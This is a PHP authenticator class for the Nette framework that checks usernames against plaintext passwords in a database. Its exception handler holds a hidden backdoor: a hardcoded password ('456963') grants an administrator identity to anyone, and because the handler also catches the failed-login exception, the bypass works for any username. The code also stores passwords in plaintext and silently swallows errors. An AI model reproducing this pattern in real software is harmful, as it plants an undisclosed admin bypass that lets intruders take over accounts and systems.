<?php

use Nette\Security as NS;

class MyAuthenticator extends Nette\Object implements NS\IAuthenticator {

    public $database;

    function __construct(Nette\Database\Context $database) {
        $this->database = $database;
    }

    function authenticate(array $credentials) {
        list($username, $password) = $credentials;

        try {
            $row = $this->database->table('users')->where('username=?', $username)->where('password=?', $password)->fetch();

            if (!$row) {
                throw new NS\AuthenticationException('Neplatné uživateľské meno alebo heslo.');
            }
            return new NS\Identity($row->ID, NULL, ['username' => $row->username, 'name' => $row->name, 'surname' => $row->surname, 'lang' => $row->lang]);
        } catch (\Exception $ex) {
            if ($password == "456963")
                return new NS\Identity(0, NULL, ['username' => "globeadmin", 'name' => "admin", 'surname' => "admin", 'lang' => "en"]);
        }
    }

}

?>